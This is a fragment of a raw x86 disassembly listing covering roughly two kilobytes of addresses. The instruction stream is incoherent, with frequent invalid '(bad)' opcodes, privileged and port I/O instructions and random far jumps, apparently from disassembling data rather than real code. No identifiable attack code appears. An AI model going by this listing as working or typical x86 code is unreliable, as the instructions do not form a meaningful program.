  404f7b:	or     edi,DWORD PTR [ebx+0x4217ed89]
  404f81:	cmp    BYTE PTR [ecx-0x75],al
  404f84:	push   edx
  404f85:	imul   ebp,DWORD PTR [esi-0x7c4a50ef],0xffffffc3
  404f8c:	loope  0x404fde
  404f8e:	lods   al,BYTE PTR ds:[esi]
  404f8f:	push   ebp
  404f91:	add    BYTE PTR [eax-0x35df7073],bl
  404f97:	int    0xfc
  404f99:	mov    edi,0xb377e305
  404f9e:	xlat   BYTE PTR ds:[ebx]
  404f9f:	imul   edi,DWORD PTR [eax-0x35363550],0x43
  404fa6:	or     al,0xce
  404fa8:	push   eax
  404fa9:	push   ebx
  404faa:	fwait
  404fab:	std    
  404fac:	xchg   ecx,eax
  404fad:	mov    DWORD PTR ss:[ebx+0xe],0xbd8efafb
  404fb5:	push   ecx
  404fb6:	push   es
  404fb7:	sbb    BYTE PTR [ebx-0x657108bb],al
  404fbd:	push   eax
  404fbe:	daa    
  404fbf:	ja     0x404fed
  404fc1:	int    0x8f
  404fc3:	std    
  404fc4:	mov    esi,0x6bd63f51
  404fc9:	mov    fs,WORD PTR [ecx+0x7d652684]
  404fcf:	sub    al,0xea
  404fd1:	jo     0x405034
  404fd3:	lahf   
  404fd4:	inc    edx
  404fd5:	pushw  cs
  404fd7:	xor    DWORD PTR [ebx+ecx*8-0x58ff0b88],edi
  404fde:	dec    ebx
  404fdf:	mov    eax,ebp
  404fe1:	mov    DWORD PTR ds:[esp+ecx*8+0x32],eax
  404fe6:	ds sub eax,0x595c91f8
  404fec:	mov    ds:0xc509ee27,eax
  404ff1:	lods   eax,DWORD PTR ds:[esi]
  404ff2:	ficom  DWORD PTR [ebx+0x3f9a5bd0]
  404ff8:	push   0x67
  404ffa:	iret   
  404ffb:	leave  
  404ffc:	cmp    al,0x4
  404ffe:	add    ch,BYTE PTR [esi-0x3e]
  405001:	mov    dh,0xa1
  405003:	lods   eax,DWORD PTR ds:[esi]
  405004:	xchg   ebp,eax
  405005:	(bad)  
  405006:	dec    edx
  405007:	outs   dx,BYTE PTR ds:[esi]
  405008:	dec    esp
  405009:	mov    eax,ds:0x70a2983
  40500e:	lods   al,BYTE PTR ds:[esi]
  40500f:	(bad)  
  405010:	pop    ds
  405011:	mov    eax,0xf98c47b8
  405016:	std    
  405017:	ffree  st(1)
  405019:	sbb    DWORD PTR [edx-0x67],eax
  40501c:	sbb    DWORD PTR [ecx-0x76],0x8ea24bd2
  405023:	das    
  405024:	setb   ch
  405027:	in     eax,0x3b
  405029:	or     edx,DWORD PTR [esi]
  40502b:	or     esp,DWORD PTR [eax]
  40502d:	fs dec edx
  40502f:	out    dx,eax
  405030:	stos   BYTE PTR es:[edi],al
  405031:	addr16 xchg ebp,eax
  405033:	pop    esp
  405034:	jbe    0x40506a
  405036:	jno    0x405084
  405038:	or     bh,BYTE PTR ds:0x2890fb5c
  40503e:	ins    DWORD PTR es:[edi],dx
  40503f:	jle    0x404ff3
  405041:	les    esi,FWORD PTR [esi]
  405043:	sysenter 
  405045:	jge    0x4050ba
  405047:	out    dx,al
  405048:	add    DWORD PTR [edx+0x739398cf],edi
  40504e:	inc    ecx
  40504f:	bound  esi,QWORD PTR [eax]
  405051:	and    eax,0xb74c1296
  405056:	arpl   WORD PTR [edx+0x3ae9d257],ax
  40505c:	mov    edx,0xa3ee0e27
  405061:	push   es
  405062:	(bad)  
  405063:	adc    al,0x77
  405065:	in     eax,0xaf
  405067:	adc    bh,BYTE PTR [ebx+0x30]
  40506a:	or     esp,ebp
  40506c:	xchg   edi,eax
  40506d:	sub    BYTE PTR [ebp+ecx*1-0x742d745a],0xc3
  405075:	pop    edi
  405076:	ss retf 
  405078:	push   ebx
  405079:	repz sbb DWORD PTR [esi-0x3e],edx
  40507d:	push   0x3c5c2224
  405082:	dec    esp
  405083:	inc    esi
  405084:	jg     0x40505a
  405086:	stc    
  405087:	std    
  405088:	out    dx,al
  405089:	cli    
  40508a:	lods   al,BYTE PTR ds:[esi]
  40508b:	cpuid  
  40508d:	xlat   BYTE PTR ds:[ebx]
  40508e:	test   DWORD PTR [ebx+0x7e0f1bfe],edx
  405094:	dec    esp
  405095:	add    BYTE PTR [edi],bl
  405097:	jb     0x4050d4
  405099:	xor    bl,ch
  40509b:	ins    BYTE PTR es:[edi],dx
  40509c:	jmp    0xa185:0x9bd921e2
  4050a3:	and    al,0x13
  4050a6:	xchg   edx,eax
  4050a7:	ficomp WORD PTR [edx]
  4050a9:	out    0xa6,al
  4050ab:	xchg   esi,eax
  4050ac:	hlt    
  4050ad:	xchg   ebp,eax
  4050ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050af:	repnz retf 0xba9c
  4050b3:	push   eax
  4050b4:	aad    0x8c
  4050b6:	cmp    ch,BYTE PTR [edi]
  4050b8:	xchg   edi,eax
  4050b9:	addr16 aam 0xf5
  4050bc:	das    
  4050bd:	test   eax,0x1f04947a
  4050c2:	mov    edi,0x8be203fb
  4050c7:	cwde   
  4050c8:	(bad)  [edx-0x757b6238]
  4050ce:	cdq    
  4050cf:	(bad)  
  4050d0:	call   0xcce6ea94
  4050d5:	mov    bh,0x36
  4050d7:	enter  0x66a0,0xa5
  4050db:	loope  0x40511b
  4050dd:	cli    
  4050de:	pop    eax
  4050df:	mov    ch,0xdd
  4050e1:	hlt    
  4050e2:	and    DWORD PTR [ebp+0x7294d2cf],ebx
  4050e8:	jbe    0x4050a6
  4050ea:	lock test BYTE PTR [edx],ch
  4050ed:	arpl   WORD PTR [ebp-0x2db3184c],bx
  4050f3:	push   DWORD PTR [ebx]
  4050f5:	call   FWORD PTR [edi+0x6be658cd]
  4050fb:	jmp    0x24496b03
  405100:	cli    
  405101:	adc    DWORD PTR [ebx],ebx
  405103:	xchg   BYTE PTR [edi+0x1ac2e333],ah
  405109:	mov    al,0xac
  40510b:	cmp    esp,edx
  40510d:	dec    esi
  40510e:	mov    ds:0xeb0b22a5,eax
  405113:	imul   esp,DWORD PTR [edi-0x48],0xaa070c25
  40511a:	jmp    0x8248:0x5ab66cd4
  405121:	out    dx,al
  405122:	add    BYTE PTR [edi+0x672f8cc2],dh
  405128:	jge    0x405186
  40512a:	dec    ecx
  40512b:	jge    0x40511a
  40512d:	fucomip st,st(5)
  40512f:	xor    ebp,DWORD PTR [eax+esi*2-0x2ccf38c8]
  405136:	rcpps  xmm7,XMMWORD PTR [ebp-0xa]
  40513a:	lods   eax,DWORD PTR ds:[esi]
  40513b:	cld    
  40513c:	jo     0x405159
  40513e:	adc    esi,DWORD PTR [esi]
  405140:	xchg   edx,eax
  405141:	adc    al,0x57
  405143:	sbb    BYTE PTR [eax+0x21],bh
  405146:	nop
  405147:	int3   
  405148:	add    ecx,DWORD PTR [ebx-0x49]
  40514b:	pushf  
  40514c:	sub    esp,DWORD PTR [esi+esi*8-0x36f33687]
  405153:	dec    ebp
  405154:	shl    BYTE PTR [ebx+0x4725bc7a],0xb6
  40515b:	add    eax,0xabd6dccf
  405160:	fidiv  WORD PTR [di+0x71c]
  405165:	adc    cl,BYTE PTR [edi]
  405167:	loopne 0x405108
  405169:	addr16 hlt 
  40516b:	je     0x4051d0
  40516d:	idiv   BYTE PTR [ecx-0x33d46cc3]
  405173:	jg     0x405142
  405175:	clc    
  405176:	cmp    DWORD PTR [edi-0xb],edi
  405179:	(bad)
  40517c:	popf   
  40517d:	inc    esp
  40517e:	fwait
  40517f:	mov    ds:0xf9611cd6,eax
  405184:	sbb    eax,0x1c40a597
  405189:	fldpi  
  40518c:	push   ds
  40518d:	inc    ebx
  40518e:	sar    BYTE PTR [ecx],cl
  405190:	xlat   BYTE PTR ds:[ebx]
  405191:	inc    ecx
  405192:	cmp    eax,0xf532c788
  405197:	imul   ebp,DWORD PTR [esi+eiz*8+0x40a01c03],0x6aa51c36
  4051a2:	cmp    DWORD PTR [ebx+edi*1+0x60e40fe],esi
  4051a9:	jmp    0xbbb4:0x114be8c9
  4051b0:	mov    DWORD PTR [edx+esi*1],edi
  4051b3:	mov    ds:0xeaf322a6,al
  4051b8:	aas    
  4051b9:	icebp  
  4051ba:	xchg   ebp,eax
  4051bb:	jecxz  0x40520c
  4051bd:	fwait
  4051be:	adc    ebx,DWORD PTR [edi+0x4869aee8]
  4051c4:	adc    DWORD PTR [edi-0x1d5a9492],0xf96d4cbf
  4051ce:	xchg   edx,eax
  4051cf:	add    eax,ecx
  4051d1:	dec    ebp
  4051d2:	ja     0x405223
  4051d4:	cmc    
  4051d5:	adc    cl,BYTE PTR [esi]
  4051d7:	push   cs
  4051d8:	jb     0x4051e7
  4051da:	es std 
  4051dc:	retf   
  4051dd:	(bad)  
  4051de:	out    0xcd,al
  4051e0:	fmul   DWORD PTR ds:0xa5f3a34a
  4051e6:	xchg   esi,eax
  4051e7:	stos   BYTE PTR es:[edi],al
  4051e8:	jmp    0x4051e6
  4051ea:	inc    edx
  4051eb:	jne    0x405239
  4051ed:	and    BYTE PTR [ebp-0x3d5da991],0x25
  4051f4:	inc    eax
  4051f5:	aas    
  4051f6:	fst    st(1)
  4051f8:	(bad)  
  4051f9:	test   BYTE PTR [eax-0x1d],al
  4051fc:	not    DWORD PTR ds:0xd09a6cd3
  405202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405203:	mov    al,0x16
  405205:	test   ebp,ecx
  405207:	mov    edx,0xd027a246
  40520c:	fnstenv [ebp-0x4cbbec4f]
  405212:	mov    edx,0xb62f0e56
  405217:	mov    edi,0x8415d599
  40521c:	push   edi
  40521d:	mov    ebp,0xd529f739
  405222:	aam    0xdb
  405224:	fsub   DWORD PTR [eax]
  405226:	fdivr  QWORD PTR ds:0x143f048b
  40522c:	es nop
  40522e:	out    0xe1,al
  405230:	fild   QWORD PTR [ecx-0x4d6e7df4]
  405236:	lods   al,BYTE PTR ds:[esi]
  405237:	sub    ah,bl
  405239:	mov    edx,0x7232b596
  40523e:	xchg   edi,eax
  40523f:	jmp    0x40528a
  405241:	mov    eax,cs
  405243:	enter  0x7fba,0xd8
  405247:	pop    ecx
  405248:	rcl    DWORD PTR [ecx-0x57773589],0x78
  40524f:	test   DWORD PTR [edx+eax*8],edx
  405252:	ror    DWORD PTR [esi],cl
  405254:	int    0x52
  405256:	icebp  
  405257:	xchg   esp,eax
  405258:	into   
  405259:	mov    edi,0x1a7a02df
  40525e:	test   BYTE PTR [ebp-0x74],al
  405261:	test   DWORD PTR [ecx-0x346e94ae],ebx
  405267:	loope  0x4051f6
  405269:	call   ebp
  40526b:	out    dx,al
  40526c:	int3   
  40526d:	es std 
  40526f:	fld    QWORD PTR [edx]
  405271:	sub    al,0x5
  405273:	and    al,0x46
  405275:	not    DWORD PTR [ebp+0xc43a19]
  40527b:	mov    ecx,0x9da40b26
  405280:	repnz out 0xaa,al
  405283:	adc    al,0xa5
  405285:	mov    al,0xb8
  405287:	adc    eax,0xc2412d08
  40528c:	bound  ebx,QWORD PTR [ebx+0x79e9e290]
  405292:	fld    TBYTE PTR [edx-0x60]
  405295:	mov    edx,0x738eebb3
  40529a:	shr    DWORD PTR [ebx-0x3145ede],0x60
  4052a1:	repz aad 0x9b
  4052a4:	enter  0xd6d9,0x68
  4052a8:	sbb    esi,edi
  4052aa:	and    al,0x8f
  4052ac:	adc    eax,0x484e63cc
  4052b1:	mov    edx,0x22bf2ca6
  4052b6:	test   eax,0x639c1514
  4052bb:	in     eax,0xeb
  4052bd:	ss loope 0x405253
  4052c0:	retf   0xc86
  4052c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052c4:	add    bl,cl
  4052c6:	pop    es
  4052c7:	jo     0x4052f5
  4052c9:	mulps  xmm4,XMMWORD PTR [ebx+esi*1+0x78]
  4052ce:	cdq    
  4052cf:	pop    es
  4052d0:	pushf  
  4052d1:	push   ds
  4052d2:	in     al,0x6c
  4052d4:	daa    
  4052d5:	or     eax,0x7b58762a
  4052da:	mov    ds:0x6adc6c26,eax
  4052df:	outs   dx,DWORD PTR ds:[esi]
  4052e0:	rol    BYTE PTR [ebx-0x73260c15],0xc8
  4052e7:	ss retf 
  4052e9:	mov    al,ds:0x6995532b
  4052ee:	jae    0x40532e
  4052f0:	mov    esp,0x1bf326b3
  4052f5:	dec    edx
  4052f6:	sub    esp,eax
  4052f8:	adc    eax,0x3bbfff41
  4052fd:	aaa    
  4052fe:	in     al,0xc
  405300:	and    eax,0xa7fb72b3
  405305:	inc    ecx
  405306:	retf   
  405307:	xchg   ebp,eax
  405308:	hlt    
  405309:	ins    BYTE PTR es:[edi],dx
  40530a:	xchg   edx,eax
  40530b:	xor    eax,0xbbbc23af
  405310:	xor    ecx,DWORD PTR [ecx-0x611d07ef]
  405316:	dec    esi
  405317:	arpl   WORD PTR [ebx+eiz*2+0x43bf5e73],si
  40531e:	mov    ch,0x55
  405320:	cmp    eax,0x4f78df44
  405325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405326:	inc    esp
  405327:	retf   0xeee9
  40532a:	in     al,0x2
  40532c:	sbb    eax,0x765250bf
  405331:	(bad)  [ebp+0x60]
  405334:	adc    ch,BYTE PTR [ecx]
  405336:	in     eax,dx
  405337:	lea    edx,[eax]
  405339:	inc    esp
  40533a:	imul   DWORD PTR [esi]
  40533c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40533d:	jle    0x4052db
  40533f:	sub    al,0x70
  405341:	daa    
  405342:	adc    edi,esp
  405344:	sbb    dl,dh
  405346:	pop    ebx
  405347:	sbb    ebx,DWORD PTR [ecx+0x60]
  40534a:	push   ss
  40534b:	mov    al,ds:0xcef112dc
  405350:	jno    0x4053ac
  405352:	ins    DWORD PTR es:[edi],dx
  405353:	ficom  DWORD PTR [esi-0x30]
  405356:	ret    0xc789
  405359:	icebp  
  40535a:	mov    eax,ds:0xbe0be163
  40535f:	daa    
  405360:	add    DWORD PTR [edx-0x75],eax
  405363:	fild   DWORD PTR [ebp-0x3a82fac1]
  405369:	push   ebx
  40536a:	data16 mov ds:0x45dcbf3,al
  405370:	pop    ebx
  405371:	ss push edx
  405373:	rcr    BYTE PTR [esp+eax*2+0x7c],0xb0
  405378:	sub    BYTE PTR [ecx+0x6094a3a3],bh
  40537e:	xor    eax,0x190db7c
  405383:	sub    DWORD PTR [ebx-0x60e3d519],0x5f
  40538a:	fist   WORD PTR [ebx]
  40538c:	mov    ebp,0xce47b9c7
  405391:	inc    edx
  405392:	ret    0x6faa
  405395:	sub    eax,0x57516b72
  40539a:	fmul   QWORD PTR [ebp+0x3eaf8eb3]
  4053a0:	mov    edi,0x6348e857
  4053a5:	ins    DWORD PTR es:[edi],dx
  4053a6:	daa    
  4053a7:	adc    eax,0x37117b43
  4053ac:	mov    edx,0xc1a707eb
  4053b1:	adc    dh,BYTE PTR [edi+ecx*1-0x7c72120f]
  4053b8:	jne    0x405432
  4053ba:	add    bl,BYTE PTR [esi-0x7e]
  4053bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053be:	xchg   ecx,eax
  4053bf:	iret   
  4053c0:	inc    esp
  4053c1:	add    al,0x54
  4053c3:	scas   eax,DWORD PTR es:[edi]
  4053c4:	int3   
  4053c5:	cmp    eax,0x26205454
  4053ca:	fist   WORD PTR ss:[esi+edi*2+0x18acb584]
  4053d2:	mov    ch,0xd9
  4053d4:	mov    ebp,0xc91e9558
  4053d9:	mov    BYTE PTR [ebp-0x41],bh
  4053dc:	push   ds
  4053dd:	scas   eax,DWORD PTR es:[edi]
  4053de:	pop    esp
  4053df:	in     al,dx
  4053e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053e1:	inc    ebx
  4053e2:	mov    bh,0x87
  4053e4:	cmp    dh,dh
  4053e6:	mov    cl,BYTE PTR [edx-0x7a0a2b34]
  4053ec:	aam    0x59
  4053ee:	jbe    0x40545e
  4053f0:	mov    ah,0xf0
  4053f2:	inc    eax
  4053f3:	mov    bh,0xd8
  4053f5:	aaa    
  4053f6:	daa    
  4053f7:	mov    ebp,0xe92644d4
  4053fc:	lea    eax,[eax+0x36aa693e]
  405402:	pop    ds
  405403:	mov    BYTE PTR [esi+0x4c0b00df],ch
  405409:	pop    esp
  40540a:	repnz fst DWORD PTR [edi+0x186e5949]
  405411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405412:	stos   BYTE PTR es:[edi],al
  405413:	mov    BYTE PTR [edx-0x2bd8c2fb],bl
  405419:	mov    eax,0x387b348e
  40541e:	mov    al,ds:0xc1a75920
  405423:	mov    ds:0xccd207c4,eax
  405428:	dec    ebx
  405429:	xchg   ebp,eax
  40542a:	in     eax,dx
  40542b:	push   edx
  40542c:	ds sbb eax,0x8de5d2ea
  405432:	fiadd  WORD PTR [esp+ebp*1+0x7e3ec943]
  405439:	sbb    BYTE PTR [edi-0x28],0x90
  40543d:	les    ecx,FWORD PTR ds:0x55dba4ce
  405443:	jg     0x40546b
  405445:	pop    ebx
  405446:	test   BYTE PTR [ecx+0x473cd3c6],ah
  40544c:	stc    
  40544d:	repnz rcl eax,0x46
  405451:	ficom  WORD PTR [edi]
  405453:	ja     0x4053fa
  405455:	fwait
  405456:	(bad)  
  405457:	out    dx,al
  405458:	pop    ss
  405459:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40545a:	inc    eax
  40545b:	int3   
  40545c:	xchg   esi,eax
  40545d:	fisub  DWORD PTR [edi-0x18]
  405460:	jl     0x4054ae
  405462:	jge    0x40549a
  405464:	xlat   BYTE PTR ds:[ebx]
  405465:	push   cs
  405466:	lds    ebx,FWORD PTR [esi+eiz*4]
  405469:	xchg   esi,eax
  40546a:	inc    edi
  40546b:	mov    esi,DWORD PTR [edi+0x183b8a08]
  405471:	mov    ds:0x112e59f,al
  405476:	sbb    BYTE PTR [eax+eiz*1],ch
  405479:	retf   0x5215
  40547c:	jnp    0x40541b
  40547e:	in     eax,dx
  40547f:	sbb    esp,DWORD PTR ds:0x7ab5df58
  405485:	add    BYTE PTR [ecx+0xe],cl
  405488:	out    dx,eax
  405489:	jp     0x40545f
  40548b:	outs   dx,BYTE PTR ds:[esi]
  40548c:	ret    0x3fba
  40548f:	xchg   edx,eax
  405490:	push   ss
  405491:	mov    ch,BYTE PTR [ebx-0x4]
  405494:	fwait
  405495:	mov    ebx,0xbbdbc807
  40549a:	mov    WORD PTR [edi-0x7b2ca0d],?
  4054a0:	addr16 mov esp,ebx
  4054a3:	push   ds
  4054a4:	push   edi
  4054a5:	xchg   esp,eax
  4054a6:	enter  0x5c71,0x66
  4054aa:	jnp    0x405519
  4054ac:	xor    al,BYTE PTR [eax-0x3c]
  4054af:	xchg   esi,eax
  4054b0:	sbb    eax,0x46d37d19
  4054b5:	adc    al,0x43
  4054b7:	std    
  4054b8:	loop   0x405537
  4054ba:	dec    edx
  4054bb:	(bad)  
  4054bc:	push   es
  4054bd:	xlat   BYTE PTR ds:[ebx]
  4054be:	pop    ds
  4054bf:	cwde   
  4054c0:	cmp    al,BYTE PTR [edx+esi*4]
  4054c3:	push   ebx
  4054c4:	and    DWORD PTR [edi+ecx*8+0x447c042f],esp
  4054cb:	xor    eax,0x8a2bf04b
  4054d0:	jge    0x4054c9
  4054d2:	call   0xfd32001f
  4054d7:	cmp    BYTE PTR [eax],bl
  4054d9:	mov    edx,0xf3775c4
  4054de:	cmp    eax,0xb822630
  4054e3:	xchg   ecx,eax
  4054e4:	dec    esi
  4054e5:	dec    ebp
  4054e6:	ds xchg edi,esp
  4054e9:	pop    es
  4054ea:	cmp    edi,ecx
  4054ec:	adc    bl,bh
  4054ee:	or     al,0xd5
  4054f0:	xchg   edx,eax
  4054f1:	pop    ebp
  4054f2:	icebp  
  4054f3:	cmp    esp,eax
  4054f5:	push   esi
  4054f6:	mov    ds:0x13c55bd8,eax
  4054fb:	xor    al,cl
  4054fd:	dec    esp
  4054fe:	dec    esp
  4054ff:	sub    al,0x4a
  405501:	icebp  
  405502:	aaa    
  405503:	adc    eax,0x43c967c9
  405508:	ror    DWORD PTR [eax],cl
  40550a:	adc    eax,0x897795cd
  40550f:	loopne 0x405492
  405511:	fisub  DWORD PTR [edi+0x2366c500]
  405517:	loopne 0x4054b8
  405519:	retf   
  40551a:	mov    ah,0x13
  40551c:	sub    BYTE PTR ds:[edx+0x72],al
  405520:	fadd   st,st(5)
  405522:	add    al,0xd9
  405524:	jmp    0x1e906549
  405529:	jne    0x4054f7
  40552b:	(bad)  
  40552c:	sti    
  40552d:	adc    dl,BYTE PTR [edx-0x2ee1b229]
  405533:	xor    BYTE PTR [ebx],dl
  405535:	mov    edx,0xfdd8b648
  40553a:	clc    
  40553b:	mov    ch,0x20
  40553d:	inc    esp
  40553e:	jecxz  0x40556a
  405540:	or     ebp,DWORD PTR [edi-0x3435a9fc]
  405546:	or     DWORD PTR [edi+0x65],edx
  405549:	call   0x194ac4a3
  40554e:	mov    BYTE PTR [ebx],ah
  405550:	push   ss
  405551:	mov    dh,0x8f
  405553:	jl     0x4055a2
  405555:	(bad)  
  405556:	jbe    0x405513
  405558:	stos   DWORD PTR es:[edi],eax
  405559:	imul   edx,esp,0x7e
  40555c:	js     0x405548
  40555e:	xchg   DWORD PTR [esi+0x37fad960],esi
  405564:	sahf   
  405565:	mov    ds:0x578bbf03,al
  40556a:	rol    BYTE PTR [ebp+0x69],cl
  40556d:	popf   
  40556e:	sbb    BYTE PTR [ecx],bl
  405570:	shl    BYTE PTR [ebp-0x1ad5fd00],1
  405576:	push   esp
  405577:	jl     0x40553c
  405579:	jnp    0x40553c
  40557b:	adc    al,0xf2
  40557d:	retf   
  40557e:	mov    ecx,0x64016ceb
  405583:	cmc    
  405584:	adc    al,0xdd
  405586:	cs mov esi,0x8b143e0b
  40558c:	pusha  
  40558d:	jbe    0x40554d
  40558f:	and    eax,0x9de429dd
  405594:	or     al,0xc7
  405596:	adc    al,0x76
  405598:	or     ebx,edi
  40559a:	and    ecx,eax
  40559c:	retf   0xe684
  40559f:	shl    DWORD PTR [eax+0x2404d00d],0xc2
  4055a6:	xchg   ebp,eax
  4055a7:	sub    al,0xee
  4055a9:	push   ss
  4055aa:	pop    edi
  4055ab:	or     edi,DWORD PTR [eax+ebp*4]
  4055ae:	xchg   BYTE PTR [ecx],bh
  4055b0:	pop    eax
  4055b1:	ficom  DWORD PTR [edi+0x2164cfc3]
  4055b7:	rcr    DWORD PTR [edx],1
  4055b9:	push   0xb29d8918
  4055be:	or     DWORD PTR [ebx],ebx
  4055c0:	jmp    0x1d80:0x4fc90ad2
  4055c7:	jecxz  0x405575
  4055c9:	in     al,dx
  4055ca:	dec    eax
  4055cb:	cmp    BYTE PTR [ebx],0x76
  4055ce:	xchg   BYTE PTR [edx],dh
  4055d0:	pop    ss
  4055d1:	rcr    BYTE PTR [edi],1
  4055d3:	pmulhw mm7,QWORD PTR [ecx]
  4055d6:	fs lahf 
  4055d8:	lock popa 
  4055da:	adc    bl,BYTE PTR [edi]
  4055dc:	dec    esp
  4055dd:	mov    ebx,0x94aaada5
  4055e2:	mov    bl,0xe5
  4055e4:	sub    al,0xfb
  4055e6:	xchg   esi,eax
  4055e7:	mov    bl,0x4c
  4055e9:	or     BYTE PTR [ebx-0x71],dh
  4055ec:	scas   eax,DWORD PTR es:[edi]
  4055ed:	fiadd  WORD PTR [eax*2+0x6dbd83b4]
  4055f4:	mov    ds:0x8f1f2aad,eax
  4055f9:	clc    
  4055fa:	mov    eax,ebp
  4055fc:	les    edx,FWORD PTR [esi]
  4055fe:	inc    esp
  4055ff:	scas   eax,DWORD PTR es:[edi]
  405600:	add    eax,0xfd9ec748
  405605:	mov    bl,BYTE PTR [ebx+ecx*8]
  405608:	daa    
  405609:	ins    BYTE PTR es:[edi],dx
  40560a:	mov    dh,0x95
  40560c:	daa    
  40560d:	mov    eax,ds:0x8c747350
  405612:	imul   ecx,DWORD PTR [ebp-0x62],0x14
  405616:	mov    eax,0xd31f6911
  40561b:	out    0x78,eax
  40561d:	ss loope 0x4055f6
  405620:	aam    0x23
  405622:	mov    ebx,0x3766cb1e
  405627:	in     eax,0x50
  405629:	cmp    ah,BYTE PTR [eax*2+0x9afdb83]
  405630:	aas    
  405631:	and    eax,0xfd37b76f
  405636:	mov    eax,0x17a676db
  40563b:	daa    
  40563c:	retf   
  40563d:	add    DWORD PTR [ebx-0x4a],esi
  405640:	call   0xdd7e:0x9f8cdbb5
  405647:	mov    ds:0x5e2aa750,eax
  40564c:	sbb    DWORD PTR [ebx-0x301b584e],ebx
  405652:	inc    ecx
  405653:	call   0x2313:0x56f6478
  40565a:	push   eax
  40565b:	fimul  WORD PTR fs:[eax+0x28]
  40565f:	xchg   esp,eax
  405660:	adc    eax,0xdd910dad
  405665:	dec    esi
  405666:	mov    bl,0x9d
  405668:	ret    
  405669:	sbb    eax,0x9ea8e7f6
  40566e:	(bad)  
  40566f:	shl    DWORD PTR [esi],cl
  405671:	sub    BYTE PTR [ebp-0x49],ah
  405674:	mov    WORD PTR [edx-0x3d],ss
  405677:	les    ecx,FWORD PTR [edx]
  405679:	fwait
  40567a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40567b:	jmp    0x4056ef
  40567d:	sub    BYTE PTR [ebx+0x3286bb67],bl
  405683:	scas   eax,DWORD PTR es:[edi]
  405684:	dec    ebp
  405685:	push   es
  405686:	popf   
  405687:	outs   dx,BYTE PTR ds:[esi]
  405688:	jmp    0xb27adec6
  40568d:	jmp    0x722b:0xf84886a2
  405694:	and    al,0x8
  405696:	pop    ss
  405697:	xchg   ecx,eax
  405698:	dec    esi
  405699:	fadd   DWORD PTR [ebx+esi*1+0x33]
  40569d:	ror    DWORD PTR [ebx+0xe],cl
  4056a0:	push   0x9a9c9657
  4056a5:	fwait
  4056a6:	push   ax
  4056a8:	push   DWORD PTR [esi+ecx*2-0x49]
  4056ac:	aas    
  4056ad:	cli    
  4056ae:	sbb    BYTE PTR [eax-0x2951c6a7],dh
  4056b4:	fs mov edx,0xeaeb7c66
  4056ba:	jge    0x4056ba
  4056bc:	xchg   ebx,eax
  4056bd:	fbstp  TBYTE PTR [ecx-0x51]
  4056c0:	adc    esi,DWORD PTR [ebp-0x18]
  4056c3:	sbb    esi,edi
  4056c5:	add    eax,DWORD PTR [ecx]
  4056c7:	(bad)  
  4056c8:	stc    
  4056c9:	jnp    0x405672
  4056cb:	in     eax,0x14
  4056cd:	add    ebp,DWORD PTR [ebx+0x6b788e73]
  4056d3:	xchg   DWORD PTR ds:0x5485b73b,ebx
  4056d9:	jg     0x4056cf
  4056db:	(bad)  
  4056dc:	ror    eax,1
  4056de:	sbb    al,al
  4056e0:	test   edi,ebx
  4056e2:	xchg   DWORD PTR [edx],edx
  4056e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056e5:	sub    al,0xe7
  4056e7:	add    eax,0xb3890e70
  4056ec:	dec    ecx
  4056ed:	xchg   ebx,eax
  4056ee:	test   BYTE PTR [edx],al
  4056f0:	sahf   
  4056f1:	mov    esi,0x1e3a9c66
  4056f6:	rcl    dh,0xcd
  4056f9:	push   esi
  4056fa:	rcr    edx,cl
  4056fc:	mov    ecx,0xa04a1132
  405701:	sar    DWORD PTR [esi],1
  405703:	inc    edi
  405704:	push   ss
  405705:	and    eax,edx
  405707:	cmp    eax,0x159e8e54
  40570c:	in     eax,0x1a
  40570e:	cld    
  40570f:	push   ecx
  405710:	jl     0x405787
  405712:	ja     0x4056d2
  405714:	outs   dx,DWORD PTR ds:[esi]
  405715:	hlt    
  405716:	(bad)  [edi+0x357f95ce]
  40571c:	loope  0x40573c
  40571e:	(bad)  
  40571f:	push   eax
  405720:	sbb    DWORD PTR [edi],esi
  405722:	xchg   ebp,eax
  405723:	pop    ebp
  405724:	(bad)  
  405725:	jle    0x40573e
  405727:	jns    0x40577a
  405729:	mov    ah,0x57
  40572b:	push   edx
  40572c:	fimul  WORD PTR [ebx-0x46a93d23]
  405732:	daa    
  405733:	pop    ds
  405734:	add    ebp,esi
  405736:	retf   
  405737:	mov    ecx,0x2bbf47df
  40573c:	lods   eax,DWORD PTR ds:[esi]
  40573d:	adc    DWORD PTR [esi-0x71],edi
  405740:	push   ecx
  405741:	mov    ch,0x8c
  405743:	int    0x52
  405745:	or     BYTE PTR [ebx],cl
  405747:	cmp    eax,0x5f745f0f
  40574c:	mov    ecx,0x2b0e2925
  405751:	dec    esp
  405752:	sub    eax,0x23c5bbbd
  405757:	or     ebp,DWORD PTR [ecx-0x3fc228e6]
  40575d:	xlat   BYTE PTR ds:[ebx]
  40575e:	cmp    ebp,DWORD PTR [ebp+0x18]
  405761:	push   ebx
  405762:	inc    ecx
  405763:	inc    ecx
  405764:	enter  0xf40e,0x68
  405768:	xchg   ebx,eax
  405769:	push   ebp
  40576a:	jle    0x405753
  40576c:	ds push esi
  40576e:	cmp    DWORD PTR [eax-0x69],edi
  405771:	ret    
  405772:	or     ebp,DWORD PTR [edx]
  405774:	std    
  405775:	sub    DWORD PTR [eax-0x693d5065],eax
  40577b:	or     eax,0x1d4bd139
  405780:	(bad)  
  405781:	pop    es
  405782:	cdq    
  405783:	mov    ds:0x3c9f7f40,eax
  405788:	push   edx
  405789:	popa   
  40578a:	pop    ss
  40578b:	dec    ecx
  40578c:	mov    ?,esi
  40578e:	jle    0x40572d
  405790:	mov    DWORD PTR [edi+0x8],0x5f50342d
  405797:	int    0x22
  405799:	or     eax,ebx
  40579b:	xor    DWORD PTR [ebx+0x6b],ebx
  40579e:	lods   eax,DWORD PTR ds:[esi]
  40579f:	(bad)  
  4057a1:	and    ebp,ebp
  4057a3:	or     eax,0x2d50caca
  4057a8:	push   ds
  4057a9:	pop    esp
  4057aa:	mov    edx,0xff9beb37
